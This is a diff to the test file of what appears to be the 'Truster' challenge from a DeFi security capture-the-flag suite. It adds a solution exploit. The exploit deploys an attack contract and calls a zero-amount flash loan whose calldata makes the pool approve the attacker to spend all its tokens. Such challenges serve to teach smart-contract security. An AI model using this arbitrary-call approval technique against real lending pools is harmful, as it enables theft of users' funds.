@@ -29,6 +29,19 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const AttackContractFactory = await ethers.getContractFactory('AttackTruster', attacker);
+        const AttackContract = await AttackContractFactory.deploy(this.pool.address, this.token.address);
+
+        const amount = 0;   // we can borrow zero because there is not a require or something and we do not care about borrowing
+        const borrower = attacker.address;
+        const target = this.token.address;
+
+        // Create the ABI to approve the attacker to spend the token in the pool
+        const abi = ["function approve(address spender, uint256 amount)"];
+        const iface = new ethers.utils.Interface(abi);
+        const data = iface.encodeFunctionData("approve", [AttackContract.address, TOKENS_IN_POOL]);
+
+        await AttackContract.attack(amount, borrower, target, data);
     });
 
     after(async function () {
